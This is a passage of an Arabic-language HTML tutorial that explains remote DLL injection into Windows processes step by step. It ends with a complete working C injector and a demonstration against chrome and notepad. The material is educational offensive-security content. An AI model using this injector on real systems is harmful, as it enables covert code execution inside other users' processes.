                    <div class="code-block"><code>&nbsp;&nbsp;pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");<br>
                        &nbsp;&nbsp;if (pLoadLibraryW == NULL) {<br>
                            &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] GetProcAddress Failed with Error : %d \n", GetLastError());<br>
                            &nbsp;&nbsp;&nbsp;&nbsp;bSTATE = FALSE; goto _EndOfFunction;<br>
                            &nbsp;&nbsp;}<br>
                        </code></div>
                    هنا بنستخدم <code style="background: #FFD700; font-size: 14px;">GetModuleHandle</code> عشان نجيب
                    <code style="background: #FFD700; font-size: 14px;">kernel32.dll</code> ، وبعدها بنستخدم
                    <code style="background: #FFD700; font-size: 14px;">GetProcAddress</code> عشان نجيب عنوان
                    <code style="background: #FFD700; font-size: 14px;">LoadLibraryW</code>.
                    لو فشلت العملية ، بتطلع Error وتخرج.
                    <li style="font-weight: bold;">نحجز مكان فـ ميموري البروسيس :</li>
                    عشان نقدر نبعت اسم الـ DLL للبروسيس ، لازم الأول نحجز مكان فـ الميموري باستخدام <code
                        style="background: #FFD700; font-size: 14px;">VirtualAllocEx</code>.
                    <div class="code-block"><code>&nbsp;&nbsp;pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);<br>
                        &nbsp;&nbsp;if (pAddress == NULL) {<br>
                            &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] VirtualAllocEx Failed with Error : %d \n", GetLastError());<br>
                            &nbsp;&nbsp;&nbsp;&nbsp;bSTATE = FALSE; goto _EndOfFunction;<br>
                            &nbsp;&nbsp;}<br>
                        </code></div>
                    بنستخدم <code style="background: #FFD700; font-size: 14px;">VirtualAllocEx</code> عشان نحجز مساحة
                    تكفي اسم الـ DLL جوه ميموري البروسيس المستهدفه.
                    ولو فشلت ، بتطلع Error وتخرج.
                    <li style="font-weight: bold;"> نكتب اسم الـ DLL فـ الميموري :</li>
                    بعد مـ حجزنا مكان فـ الميموري ، دلوقتي نكتب مسار الـ DLL فـ المكان ده باستخدام <code
                        style="background: #FFD700; font-size: 14px;">WriteProcessMemory</code>.
                    <div class="code-block"><code>&nbsp;&nbsp;if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &lpNumberOfBytrsWritten) || dwSizeToWrite != lpNumberOfBytrsWritten) {<br>
                        &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] WriteProcessMemory Failed with Error : %d \n", GetLastError());<br>
                        &nbsp;&nbsp;&nbsp;&nbsp;bSTATE = FALSE; goto _EndOfFunction;<br>
                        &nbsp;&nbsp;}<br>
                    </code></div>
                    بنستخدم <code style="background: #FFD700; font-size: 14px;">WriteProcessMemory</code> عشان نكتب اسم
                    الـ DLL فـ الميموري اللـ حجزناها.
                    وبنتأكد إن كل البيانات اتكتبت صح ، ولو فـ مشكلة بتطلع Error وتخرج.
                    <li style="font-weight: bold;">ننشئ Thread جديد فـ البروسيس :</li>
                    دلوقتي بقى عندنا مسار الـ DLL فـ ميموري البروسيس ، فهنستخدم <code
                        style="background: #FFD700; font-size: 14px;">CreateRemoteThread</code> عشان نشغل
                    LoadLibraryW
                    اللـ هتقوم بتحميل الـ DLL.
                    <div class="code-block"><code>&nbsp;&nbsp;hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);<br>
                        &nbsp;&nbsp;if (hThread == NULL ) {<br>
                            &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] CreateRemoteThread Failed with Error : %d \n", GetLastError());<br>
                            &nbsp;&nbsp;&nbsp;&nbsp;bSTATE = FALSE; goto _EndOfFunction;<br>
                            &nbsp;&nbsp;}<br>
                        </code></div>
                    <code style="background: #FFD700; font-size: 14px;">CreateRemoteThread</code> هي اللـ بتشغل <code
                        style="background: #FFD700; font-size: 14px;">LoadLibraryW</code> جوه البروسيس ، وبتاخد كـ
                    Argument العنوان بتاع
                    الميموري
                    اللـ كتبنا فيه اسم الـ DLL.
                    ولو العملية فشلت ، بتطلع Error وتخرج.
                    <li style="font-weight: bold;">نقفل الـ Thread اللـ فتحناه :</li>
                    بعد مـ خلصنا كل حاجة ، بنقفل الـ <code style="background: #FFD700; font-size: 14px;">Thread</code>
                    عشان منسيبش <code style="background: #FFD700; font-size: 14px;">Handle Leak</code>.
                    <div class="code-block"><code>_EndOfFunction:<br>
                        &nbsp;&nbsp;if (hThread)<br>
                        &nbsp;&nbsp;&nbsp;&nbsp;CloseHandle(hThread);<br>
                        &nbsp;&nbsp;return bSTATE;<br>
                        &nbsp;&nbsp;}
                    </code></div>
                    أي Thread أو Handle استخدمناه ، لازم نقفله بعد مـ نخلص شغلنا عشان منسيبش <code
                        style="background: #FFD700; font-size: 14px;">Handle Leaks</code>.
                </ol>
                <p style="border-top: 2px solid #FFD700;"></p>
                <p style="font-weight: bold; font-size: larger; direction: ltr;">Step 4 : Execution and Cleanup</p>
                <p>[+] هنبدأ نجهز الـ <code style="background: #FFD700; font-size: 14px;">main function</code> ، واللـ
                    فيها هنتأكد من استدعاء الدوال اللـ كتبناها قبل كده ، والتأكد
                    إن كل العمليات ماشية زي الفل.</p>


                <ol>
                    <li style="font-weight: bold;">تغيير الـ main والتحقق من الـ Arguments :</li>
                    فـ البداية عدلت الـ <code style="background: #FFD700; font-size: 14px;">main</code> لـ <code
                        style="background: #FFD700; font-size: 14px;">wmain</code> عشان تقدر تستوعب الحروف الـ <code
                        style="background: #FFD700; font-size: 14px;">Unicode
                            أو UTF-16</code> .. وبعد كدا قبل أي
                    حاجة
                    البرنامج بيتأكد إن اليوزر دخل الـ arguments المطلوبة:
                    <ul>
                        <li> اسم أو مسار الـ DLL</li>
                        <li> اسم العملية المستهدفة</li>
                    </ul>
                    ولو مش موجودين بيطبع رسالة توضح طريقة الاستخدام ويخرج من البرنامج.
                    <div class="code-block"><code>int wmain(int argc, wchar_t* argv[]) {<br><br>

                        &nbsp;&nbsp;if (argc < 3) {<br>
                            &nbsp;&nbsp;&nbsp;&nbsp;wprintf(L"[i] Usage : \"%s\" &lt;DLL File or Path> &lt;Process Name> \n", argv[0]);<br>
                            &nbsp;&nbsp;&nbsp;&nbsp;return -1;<br>
                            &nbsp;&nbsp;}<br>
                    </code></div>
                    <li style="font-weight: bold;">البحث عن البروسيس المستهدفه :</li>
                    بنستدعي الفانكشن اللـ بتبحث عن البروسيس وتجيب الهاندل.
                    <div class="code-block"><code> &nbsp;&nbsp;wprintf(L"[i] Searching For Process ID of \"%s\" ... ", argv[2]);<br>
                        &nbsp;&nbsp;if (!GetRemoteProcessHandle(argv[2], &dwProcessId, &hProcess)) {<br>
                            &nbsp;&nbsp; &nbsp;&nbsp;printf("[!] Process not found. \n");<br>
                            &nbsp;&nbsp; &nbsp;&nbsp;return -1;<br>
                            &nbsp;&nbsp;}<br>
                    </code></div>
                    <li style="font-weight: bold;">تنفيذ الحقن :</li>
                    هنا بنستدعي الفانكشن اللـ بتحقن ملف الـ DLL.
                    <div class="code-block"><code>&nbsp;&nbsp;if (!DLLInjectionToRemoteProcess(hProcess, argv[1])) {<br>
                        &nbsp;&nbsp;&nbsp;&nbsp;return -1;<br>
                        &nbsp;&nbsp;}</code></div>
                    <li style="font-weight: bold;">ننهي البرنامج ونقفل الـ Handle :</li>
                    بنقفل الهاندل عشان نمنع الـ <code style="background: #FFD700; font-size: 14px;">Handle Leak</code>.
                    <div class="code-block"><code>	CloseHandle(hProcess);</code></div>
                </ol>
                <p>[+] كدا خلصنا شرح الكود .. هتـ Build البروجيكت ع الـ Debug.</p>
                <p style="border-top: 2px solid #FFD700;"></p>
                <p style="font-weight: bold;">[+] يلا نـ رن ونجرب :</p>
                <ol>
                    <li>لو جربت تـ رن البرنامج لوحده ، هيطلعلك الإستخدام :</li>
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/RemoteDLLi-1.png" alt="RemoteDLLInjection-1" class="article-image"
                            loading="lazy">
                    </div>
                    <li>هترن البرنامج وتديله مسار ملف الـ DLL اللـ عملناه .. وهتديله البروسيش اللـ شغالة .. هتلاقي إنه
                        لقي الـ PID بتاعها .. وهتلاقيها موجودة ع <a
                            href="https://sourceforge.net/projects/processhacker/" target="_blank"
                            class="download-link">Process Hacker</a> :</li>
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/RemoteDLLi-2.png" alt="RemoteDLLInjection-2" class="article-image"
                            loading="lazy">
                    </div>
                    <li>لما تخليه يشتغل .. هتلاقي فـ <code style="background: #FFD700; font-size: 14px;">Modules</code>
                        إن الملف بتاعنا بقي موجود :</li>
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/RemoteDLLi-3.png" alt="RemoteDLLInjection-3" class="article-image"
                            loading="lazy">
                    </div>
                    <li>وفعلا الملف اشتغل من الـ chrome :</li>
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/RemoteDLLi-4.png" alt="RemoteDLLInjection-4" class="article-image"
                            loading="lazy">
                    </div>
                    <li>تاني بروسيس جربت عليها وهي الـ notepad.exe :</li>
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/RemoteDLLi-5.png" alt="RemoteDLLInjection-5" class="article-image"
                            loading="lazy">
                    </div>
                    <li>الملف ارتبط بالبروسيس بنجاح :</li>
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/RemoteDLLi-6.png" alt="RemoteDLLInjection-6" class="article-image"
                            loading="lazy">
                    </div>
                    <li>واشتغل بالفعل من الـ notepad :</li>
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/RemoteDLLi-7.png" alt="RemoteDLLInjection-7" class="article-image"
                            loading="lazy">
                    </div>
                </ol>
                <p style="border-top: 2px solid #FFD700;"></p>
                <p>[+] الكود النهائي :</p>
                <div class="code-block"><code>#include &lt;Windows.h><br>
                    #include &lt;stdio.h><br>
                    #include &lt;TlHelp32.h><br><br>
                    
                    BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess)<br>
                    {<br>
                        &nbsp;&nbsp;HANDLE hSnapshot = NULL;<br>
                        &nbsp;&nbsp;PROCESSENTRY32 Proc = { .dwSize = sizeof(PROCESSENTRY32) };<br><br>
                    
                        &nbsp;&nbsp;hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);<br>
                        &nbsp;&nbsp;if (hSnapshot == INVALID_HANDLE_VALUE) {<br>
                            &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] CreateToolhelp32Snapshot Failed with Error : %d \n", GetLastError());<br>
                            &nbsp;&nbsp;&nbsp;&nbsp;goto _EndOfFunction;<br>
                            &nbsp;&nbsp;}<br><br>
                    
                            &nbsp;&nbsp;if (!Process32First(hSnapshot, &Proc)) {<br>
                                &nbsp;&nbsp;&nbsp;&nbsp;printf("[i] Process32First Failed with Error : %d \n", GetLastError());<br>
                                &nbsp;&nbsp;&nbsp;&nbsp;goto _EndOfFunction;<br>
                                &nbsp;&nbsp;}<br><br>
                    
                                &nbsp;&nbsp;do {<br>
                                    &nbsp;&nbsp;&nbsp;&nbsp;WCHAR LowerName[MAX_PATH * 2];<br><br>
                    
                                    &nbsp;&nbsp;&nbsp;&nbsp;if (Proc.szExeFile) {<br><br>
                    
                                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DWORD dwSize = lstrlenW(Proc.szExeFile);<br>
                                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DWORD i = 0;<br><br>
                    
                                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RtlSecureZeroMemory(LowerName, MAX_PATH * 2);<br><br>
                    
                                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (dwSize < MAX_PATH * 2) {<br>
                                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for (; i < dwSize; i++) {<br>
                                                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);<br>
                                                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>
                                                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LowerName[i++] = '\0';<br>
                                                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>
                                                &nbsp;&nbsp;}<br><br>
                    
                                                &nbsp;&nbsp;if (wcscmp(LowerName, szProcessName) == 0) {<br>
                                                    &nbsp;&nbsp;&nbsp;&nbsp;*dwProcessId = Proc.th32ProcessID;<br>
                                                    &nbsp;&nbsp;&nbsp;&nbsp;*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);<br>
                                                    &nbsp;&nbsp;&nbsp;&nbsp;if (*hProcess == NULL)<br>
                                                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("[!] OpenProcess Failed with Error : %d \n", GetLastError());<br>
                                                    &nbsp;&nbsp;&nbsp;&nbsp;break;<br>
                                                    &nbsp;&nbsp;}<br><br>
                    
                        } while (Process32Next(hSnapshot, &Proc));<br><br>
                    
                    
                    
                    _EndOfFunction:<br>
                    &nbsp;&nbsp;if (hSnapshot != NULL)<br>
                    &nbsp;&nbsp;&nbsp;&nbsp;CloseHandle(hSnapshot);<br>
                            &nbsp;&nbsp;if (*dwProcessId == NULL || *hProcess == NULL)<br>
                            &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
                            &nbsp;&nbsp;return TRUE;<br><br>
                    
                    }<br><br>
                    
                    BOOL DLLInjectionToRemoteProcess(HANDLE hProcess, LPWSTR DllName) {<br>
                        &nbsp;&nbsp;BOOL bSTATE = TRUE;<br>
                        &nbsp;&nbsp;LPVOID pLoadLibraryW = NULL;<br>
                        &nbsp;&nbsp;LPVOID pAddress = NULL;<br>
                        &nbsp;&nbsp;DWORD dwSizeToWrite = lstrlenW(DllName) * sizeof(WCHAR);<br>
                        &nbsp;&nbsp;SIZE_T lpNumberOfBytrsWritten = NULL;<br>
                        &nbsp;&nbsp;HANDLE hThread = NULL;<br><br>
                    
                        &nbsp;&nbsp;pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");<br>
                        &nbsp;&nbsp;if (pLoadLibraryW == NULL) {<br>
                            &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] GetProcAddress Failed with Error : %d \n", GetLastError());<br>
                            &nbsp;&nbsp;&nbsp;&nbsp;bSTATE = FALSE; goto _EndOfFunction;<br>
                            &nbsp;&nbsp;}<br><br>
                    
                            &nbsp;&nbsp;pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);<br>
                            &nbsp;&nbsp;if (pAddress == NULL) {<br>
                                &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] VirtualAllocEx Failed with Error : %d \n", GetLastError());<br>
                                &nbsp;&nbsp;&nbsp;&nbsp;bSTATE = FALSE; goto _EndOfFunction;<br>
                                &nbsp;&nbsp;}<br><br>
                    
                                &nbsp;&nbsp;printf("[i] pAddress Allocated at : %d\n", pAddress, dwSizeToWrite);<br>
                                &nbsp;&nbsp;printf("[i] Press &lt;Enter> to Write ...");<br>
                        &nbsp;&nbsp;getchar();<br><br>
                    
                        &nbsp;&nbsp;if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &lpNumberOfBytrsWritten) || dwSizeToWrite != lpNumberOfBytrsWritten) {<br>
                            &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] WriteProcessMemory Failed with Error : %d \n", GetLastError());<br>
                            &nbsp;&nbsp;&nbsp;&nbsp;bSTATE = FALSE; goto _EndOfFunction;<br>
                            &nbsp;&nbsp;}<br>
                            &nbsp;&nbsp;printf("[i] Successfully Written %d Bytes\n", lpNumberOfBytrsWritten);<br>
                            &nbsp;&nbsp;printf("[i] Press &lt;Enter> to Run ...");<br>
                            &nbsp;&nbsp;getchar();<br><br>
                    
                            &nbsp;&nbsp;printf("[i] Executing DLL ...\n");<br>
                            &nbsp;&nbsp;hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);<br>
                            &nbsp;&nbsp;if (hThread == NULL ) {<br>
                                &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] CreateRemoteThread Failed with Error : %d \n", GetLastError());<br>
                                &nbsp;&nbsp;&nbsp;&nbsp;bSTATE = FALSE; goto _EndOfFunction;<br>
                            }<br><br>
                    
                    printf("[i] DONE ...\n");<br><br>
                    
                    
                    _EndOfFunction:<br>
                    &nbsp;&nbsp;if (hThread)<br>
                    &nbsp;&nbsp;&nbsp;&nbsp;CloseHandle(hThread);<br>
                            &nbsp;&nbsp;return bSTATE;<br>
                    }<br><br>
                    
                    int wmain(int argc, wchar_t* argv[]) {<br><br>
                    
                        &nbsp;&nbsp;HANDLE hProcess   = NULL;<br>
                        &nbsp;&nbsp;DWORD dwProcessId = NULL;<br><br>
                    
                        &nbsp;&nbsp;if (argc < 3) {<br>
                            &nbsp;&nbsp;&nbsp;&nbsp;wprintf(L"[i] Usage : \"%s\" &lt;DLL File or Path> &lt;Process Name> \n", argv[0]);<br>
                            &nbsp;&nbsp;&nbsp;&nbsp;return -1;<br>
                            &nbsp;&nbsp;}<br><br>
                    
                            &nbsp;&nbsp;wprintf(L"[i] Searching For Process ID of \"%s\" ... ", argv[2]);<br>
                            &nbsp;&nbsp;if (!GetRemoteProcessHandle(argv[2], &dwProcessId, &hProcess)) {<br>
                                &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] Process not found. \n");<br>
                                &nbsp;&nbsp;&nbsp;&nbsp;return -1;<br>
                                &nbsp;&nbsp;}<br><br>
                    
                                &nbsp;&nbsp;wprintf(L"[i] DONE \n");<br>
                                &nbsp;&nbsp;printf("[i] Found Target Process PID : %d \n", dwProcessId);<br><br>
                    
                                &nbsp;&nbsp;if (!DLLInjectionToRemoteProcess(hProcess, argv[1])) {<br>
                                    &nbsp;&nbsp;&nbsp;&nbsp;return -1;<br>
                                    &nbsp;&nbsp;}<br><br>
                    
                                    &nbsp;&nbsp;CloseHandle(hProcess);<br>
                                    &nbsp;&nbsp;printf("[i] Press &lt;ENTER> to Quit ...");<br>
                        &nbsp;&nbsp;getchar();<br><br>
                    
                        &nbsp;&nbsp;return 0;<br>
                    }</code></div>
                <p style="border-top: 2px solid #FFD700;"></p>
                <p style="border-top: 2px solid #FFD700;"></p>
                <p>وبكدا . أتمني تكون استفدت حاجه .. ونلتقي فـ مقالة قادمة .. ولو عندك أي تعليق ، استفسار ، أي حاجه ..
                    متترددش وكلمني.</p>
            </div>
            <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="300">
                <h2>References</h2>
                <p>خدلك لفة فـ المصادر والمراجع يا عزيزي:</p>

                <ul style="direction: ltr;">
                    <li><a href="https://pentestlab.blog/2017/04/04/dll-injection/" target="_blank"
                            class="download-link" s>DLL Injection - Pentestlab Blog</a>
                    </li>
                    <li><a href="https://www.ired.team/offensive-security/code-injection-process-injection/dll-injection"
                            target="_blank" class="download-link">DLL Injection - Red Team Notes</a></li>

                    <li><a href="https://n10h0ggr.github.io/posts/DLL-Injection/" target="_blank"
                            class="download-link">DLL
                            Injection - n10h0ggr</a></li>
                    <li><a href="https://www.stackzero.net/dll-injection-example/" target="_blank"
                            class="download-link">How
                            To Do DLL Injection</a></li>
                    <li><a href="https://attack.mitre.org/techniques/T1055/001/" target="_blank"
                            class="download-link">Process Injection: Dynamic-link Library Injection</a></li>
                    <li><a href="https://medium.com/@0xey/t1055-001-process-injection-dll-injection-64dc14719faa"
                            target="_blank" class="download-link">T1055:001 - Process Injection: DLL Injection
                            [Theoretical
                            and Demonstration]</a></li>

                    </li>
                </ul>
            </div>
            <div class="nav-buttons">
                <a href="./Shellcode-Injection.html" onclick="nextArticle()" style="direction: ltr;">Next →</a>
                <a href="./Payload-Obfuscation.html" onclick="previousArticle()" style="direction: ltr;">← Previous</a>
            </div>
    </section>
    <footer class="footer" data-aos="zoom-in" data-aos-duration="800" style="direction: ltr;">
        <p>&copy; <span id="year"></span> <a href="https://0x4de1.github.io">0x4de1</a>. All rights reserved.</p>
    </footer>

    <script src="../src/JS/script.js"></script>
    <script src="https://unpkg.com/aos@next/dist/aos.js" defer></script>
    <script>
        window.onload = function () {
            AOS.init({ offset: 0 });
        };
    </script>
    <script>document.getElementById("year").textContent = new Date().getFullYear();</script>
</body>

</html>